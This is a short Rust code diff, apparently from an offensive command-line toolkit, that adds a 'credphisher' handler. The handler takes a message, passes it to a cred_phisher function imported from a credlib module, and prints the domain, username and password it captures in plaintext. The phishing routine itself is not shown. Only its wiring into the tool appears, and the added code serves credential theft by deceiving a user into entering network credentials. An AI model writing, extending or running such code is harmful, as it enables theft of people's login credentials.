@@ -27,6 +27,7 @@ use super::{debug_trace};
 #[allow(unused_imports)]
 use super::loglib::{log_get_timestamp,log_output_function,init_log};
 
+use super::credlib::{NetworkCredentials,cred_phisher};
 
 extargs_error_class!{NCredError}
 
@@ -35,6 +36,14 @@ fn credphisher_handler(ns :NameSpaceEx,_optargset :Option<Arc<RefCell<dyn ArgSet
 	let sarr :Vec<String>;
 
 	init_log(ns.clone())?;
+	sarr = ns.get_array("subnargs");
+	if sarr.len() < 1 {
+		extargs_new_error!{NCredError,"need message"}
+	}
+
+	let cred :NetworkCredentials = cred_phisher(&sarr[0])?;
+
+	println!("domain [{}] name [{}] password [{}]", cred.Domain,cred.Username,cred.Password);
 
 	return Ok(());
 }
